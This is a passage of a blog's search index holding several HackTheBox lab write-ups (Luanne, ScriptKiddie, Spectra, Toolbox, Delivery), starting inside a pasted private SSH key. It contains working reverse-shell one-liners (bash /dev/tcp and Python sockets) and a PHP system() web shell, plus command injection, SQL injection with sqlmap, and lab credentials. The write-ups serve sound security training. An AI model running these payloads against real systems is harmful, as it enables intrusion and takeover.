EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM 3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF 8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3 GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl 7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8 Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6 LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv +ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq 189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9 9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b 45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG -----END OPENSSH PRIVATE KEY----- Now we can connect via ssh Root NetBSD has identical to sudo command which doas If we check config file, we see that r.michaels can run anything as root But we need a password If we check home directory of the user, we have backups folder containing archive which is encrypted The directory also contains .gnupg, If we try using the keyrings for decryption, they work Let\u0026rsquo;s check the content of the archive There is a .htpasswd file with credentials Crack it with hashcat webapi_user:littlebear Use the password for doas and get a root flag ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/luanne/images/luanne.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/luanne/","summary":"Luanne Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.218 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 17:33 BST Nmap scan report for 10.10.10.218 (10.10.10.218) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20977f6c4a6e5d20cffda3aaa90d37db (RSA) | 521 35c329e187706d7374b2a9a204a96669 (ECDSA) |_ 256 b3bd316dcc226b18ed2766b4a72ae4a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-robots.","tags":["HTB","netbsd","supervisor-process-manager","ffuf","lua","command-injection","doas","pgp","netpgp"],"title":"[HTB] Machine: Luanne"},{"categories":null,"contents":"ScriptKiddie Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.226 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 19:55 BST Nmap scan report for 10.10.10.226 (10.10.10.226) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA) | 256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA) |_ 256 8bcf4182c6acef9180377cc94511e843 (ED25519) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-title: k1d\u0026#39;5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.63 seconds Web server Foothold I tried different payloads for command injection, but none of them worked So I checked if there are any exploit for any of the services running But we don\u0026rsquo;t have a version of the mfsvenom So let\u0026rsquo;s try the exploit anyway We can generate payload using msfconsole or python script I chose msfconsole since it was easier to do Generate payload Upload it and launch it User We can read pwn\u0026rsquo;s directory Upon scanning we see scanlosers.sh script, which looks like automated job since it saves output to recon folder We can edit the script But we need to find the format of the lines in the input file /home/kid/logs/hackers If we grep for hackers in kid\u0026rsquo;s home directory we find the source code for the app and the lines of code responsible for saving the logs Looks like the format is [2023-07-10 21:18:21.342176] 10.10.16.12 But the file is empty, which means it get cleaned since I definitely tried command injections Let\u0026rsquo;s try injecting the commands to the log file The script cuts out the 3 column and supplies it to nmap, so we add \u0026lsquo;a a 127.0.0.1\u0026rsquo; to pass the check Then we have our command and comment out the rest of the command with # Let\u0026rsquo;s get reverse shell echo \u0026quot;a a 127.0.0.1;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.12/7777 0\u0026gt;\u0026amp;1' #\u0026quot; \u0026gt; hackers Root pwn has sudo rights Follow GTFOBins to get a root ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/images/scriptkiddie.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/","summary":"ScriptKiddie Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.226 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 19:55 BST Nmap scan report for 10.10.10.226 (10.10.10.226) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA) | 256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA) |_ 256 8bcf4182c6acef9180377cc94511e843 (ED25519) 5000/tcp open http Werkzeug httpd 0.","tags":["HTB","msfvenom","command-injection","irb","msfconsole"],"title":"[HTB] Machine: ScriptKiddie"},{"categories":null,"contents":"Spectra Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.229 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 12:59 BST Nmap scan report for 10.10.10.229 (10.10.10.229) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn\u0026#39;t have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.25 seconds Web server The domain: spectra.htb If we check /testing We see the config file wp-config.php which runs php in the background if we click it We see another config file wp-config.php.save, which wascreated by nano ...nano will try to dump the buffer into an emergency file. This will happen mainly if nano receives a SIGHUP or SIGTERM or runs out of memory. It will write the buffer into a file named nano.save if the buffer didn’t have a name already, or will add a “.save” suffix to the current filename... Let\u0026rsquo;s save the creds devtest:devteam01 Any try to connect to MySQL But no success We saw that the website on /main was a WordPress site So let\u0026rsquo;s launch a wpscan ┌──(kali㉿kali)-[~/Documents/tasks] └─$ wpscan --url http://10.10.10.229/main _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n ^C^C^C^C^C^C Scan Aborted: Canceled by User ┌──(kali㉿kali)-[~/Documents/tasks] └─$ wpscan --url http://spectra.htb/main -e ap,t,tt,u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://spectra.htb/main/ [10.10.10.229] [+] Started: Sat Aug 5 13:17:25 2023 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.17.4 | - X-Powered-By: PHP/5.6.40 | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://spectra.htb/main/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://spectra.htb/main/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; | - http://spectra.htb/main/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.2 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: \u0026#39;Version: 1.2\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:21 \u0026lt;============================================================================================================================================================\u0026gt; (399 / 399) 100.00% Time: 00:00:21 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] Theme(s) Identified: [+] twentynineteen | Location: http://spectra.htb/main/wp-content/themes/twentynineteen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentynineteen/readme.txt | [!] The version is out of date, the latest version is 2.5 | Style URL: http://spectra.htb/main/wp-content/themes/twentynineteen/style.css | Style Name: Twenty Nineteen | Style URI: https://wordpress.org/themes/twentynineteen/ | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://spectra.htb/main/wp-content/themes/twentynineteen/, status: 200 | | Version: 1.5 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentynineteen/style.css, Match: \u0026#39;Version: 1.5\u0026#39; [+] twentyseventeen | Location: http://spectra.htb/main/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://spectra.htb/main/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://spectra.htb/main/wp-content/themes/twentyseventeen/, status: 200 | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentyseventeen/style.css, Match: \u0026#39;Version: 2.3\u0026#39; [+] twentytwenty | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.2 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/, status: 200 | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css, Match: \u0026#39;Version: 1.2\u0026#39; [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:51 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:51 [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:11 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:11 [i] User(s) Identified: [+] administrator | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Aug 5 13:20:06 2023 [+] Requests Done: 3035 [+] Cached Requests: 17 [+] Data Sent: 859.413 KB [+] Data Received: 1.155 MB [+] Memory used: 286.766 MB [+] Elapsed time: 00:02:40 Foothold We have administrator user If we try the password that we found before, we can access wp-admin Administrator:devteam01 Let\u0026rsquo;s edit installed plugins and get RCE system($_REQUEST[\u0026quot;cmd\u0026quot;]); Let\u0026rsquo;s get reverse shell Url encode the following payload: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.16.2\u0026quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' And we have our foothold User So we have a Chromium OS nginx@spectra /home $ cat /etc/*release BUILD_NUMBER=22 CHROMEOVER_BUILD_COMMIT=829e617e7b8467c355f9bd61f87835bfeb0da547 CHROMIUMOS_MANIFEST_COMMIT=38c4f6ca60a47f7fabf0fcd5d6feabf349e3f002 CHROMIUM_BROWSER_COMMIT=ef24d0b3349c2324d18a3f32bc35d14e796aeddc PIPELINE_TAG=prod USE_FLAGS=-cros-debug beerover virtualbox GOOGLE_RELEASE=87.3.41 CHROMEOS_RELEASE_BRANCH_NUMBER=85 CHROMEOS_RELEASE_TRACK=stable-channel CHROMEOS_RELEASE_KEYSET=devkeys CHROMEOS_RELEASE_NAME=Chromium OS CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update CHROMEOS_RELEASE_BOARD=chromeover64 CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/ CHROMEOS_RELEASE_BUILD_NUMBER=13505 CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1} CHROMEOS_RELEASE_CHROME_MILESTONE=87 CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352 CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware CHROMEOS_RELEASE_VERSION=87.3.41 CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64 We have a autologin.conf.orig file in /opt If we check it, we see that it\u0026rsquo;s a script It reads password from the files /mnt/stateful_partition/etc/autologin/passwd and from /etc/autologin/passwd Only /etc/autologin/passwd exists, and if we open it we see the potential password SummerHereWeCome!! Let\u0026rsquo;s ssh We can use crackmapexec to test each connection But since I saw user.txt in katie\u0026rsquo;s folder, I just guessed it and got access Root Check sudo rights We have /sbin/initctl https://linux.die.net/man/8/initctl initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon https://linux.die.net/man/8/init init is the parent of all processes on the system, it is executed by the kernel and is responsible for starting all other processes If we check katie\u0026rsquo;s group We see that she\u0026rsquo;s a member of developers group katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) Let\u0026rsquo;s search for files owned by developers So we see the that developers have several test jobs inside /etc/init directory So we can try and modify one of them Let\u0026rsquo;s edit one of those .conf files Add exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.16.2\u0026quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);' Launch a listener and sudo initctl start test Rooted ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/spectra/images/spectra.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/spectra/","summary":"Spectra Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.229 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 12:59 BST Nmap scan report for 10.10.10.229 (10.10.10.229) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn\u0026#39;t have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) Service detection performed.","tags":["HTB","chromeos","nano","wordpress","wpscan","wordpress-plugin","autologon-credentials","initctl","sudo"],"title":"[HTB] Machine: Spectra"},{"categories":null,"contents":"Toolbox Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.236 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 19:02 BST Nmap scan report for 10.10.10.236 (10.10.10.236) Host is up (0.15s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 5b1aa18199eaf79602192e6e97045a3f (RSA) | 256 a24b5ac70ff399a13aca7d542876b2dd (ECDSA) |_ 256 ea08966023e2f44f8d05b31841352339 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) |_http-title: MegaLogistics | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR | Not valid before: 2020-02-18T17:45:56 |_Not valid after: 2021-02-17T17:45:56 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.38 (Debian) 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-07-09T18:02:45 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required |_clock-skew: -32s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.49 seconds Web server There is also a certificate for admin.megalogistic.com ffuf └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.10.10.236 -H \u0026#34;Host: FUZZ.megalogistic.com\u0026#34; -k -fs 22357 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : https://10.10.10.236 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.megalogistic.com :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 22357 ________________________________________________ [Status: 200, Size: 889, Words: 134, Lines: 36, Duration: 124ms] admin.megalogistic.com ftp smb Foothold/User So the only option is to check admin panel I went through possible entry point payloads We have an error indicating that the backend database is postgresql Since we know the database, we can test bypass login payloads from Hacktricks I went with the following payload ' or 1=1 -- But found nothing So I ran sqlmap by saving request file from Burp sqlmap -r admin.megalogistic --force-ssl --batch --dbs to list databases sqlmap -r admin.megalogistic --force-ssl --batch -D public --tables to dump tables from public database sqlmap -r admin.megalogistic --force-ssl --batch -D public -T users --dump to dump users table Retrieved admin\u0026rsquo;s hash 4a100a85cb5ca3616dcf137918550815 - but failed to crack it Let\u0026rsquo;s try executing commands sqlmap -r admin.megalogistic --force-ssl --batch --os-cmd whoami And it works Let\u0026rsquo;s get reverse shell Spawn interactive shell to send a payload sqlmap -r admin.megalogistic --force-ssl --batch --os-shell Payload: bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.12/6666 0\u0026gt;\u0026amp;1\u0026quot; The flag can be found in /var/lib/postgresql folder Root Currently we\u0026rsquo;re in the container and need to escape it Enumeration of the container revealed nothing We might need to check the exe file found in ftp We saw Docker Toolbox Found boot2docker Apparently we can ssh to VM using following credentials docker:tcuser If we check ifconfig, we have 172.17.0.2 so VM is probably .1 We have sudo rights If we check the /etc/*release It is indeed boot2docker Let\u0026rsquo;s continue checking directories We have c folder in the / path If we check it, we see Users If we continue following the path, we have an access to Administrator\u0026rsquo;s directory So Users is probably mounted to c If we check Administrator\u0026rsquo;s directory we find .ssh folder which contains his keys Let\u0026rsquo;s copy them and connect ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/toolbox/images/toolbox.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/toolbox/","summary":"Toolbox Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.236 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 19:02 BST Nmap scan report for 10.10.10.236 (10.10.10.236) Host is up (0.15s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.","tags":["HTB","docker-toolbox","ffuf","sqli","postgresql","sqlmap","docker","container"],"title":"[HTB] Machine: Toolbox"},{"categories":null,"contents":"Delivery Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.222 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 11:18 BST Nmap scan report for 10.10.10.222 (10.10.10.222) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c40fa859b01acac0ebc0c19518aee27 (RSA) | 256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA) |_ 256 b79df7489da2f27630fd42d3353a808c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache, max-age=31556926, public | Content-Length: 3108 | Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; cdn.rudderlabs.com | Content-Type: text/html; charset=utf-8 | Last-Modified: Sat, 08 Jul 2023 09:51:21 GMT | X-Frame-Options: SAMEORIGIN | X-Request-Id: 6oxj36iapprdtktd5691zuzu4r | X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false | Date: Sat, 08 Jul 2023 10:17:53 GMT | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;robots\u0026#34; content=\u0026#34;noindex, nofollow\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Mattermost\u0026lt;/title\u0026gt;\u0026lt;meta name=\u0026#34;mobile-web-app-capable\u0026#34; content=\u0026#34;yes\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;application-name\u0026#34; content=\u0026#34;Mattermost\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;format-detection\u0026#34; content=\u0026#34;telephone=no\u0026#34;\u0026gt;\u0026lt;link re | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Date: Sat, 08 Jul 2023 10:17:53 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8065-TCP:V=7.93%I=7%D=7/8%Time=64A937EE%P=x86_64-pc-linux-gnu%r(Gen SF:ericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te SF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2 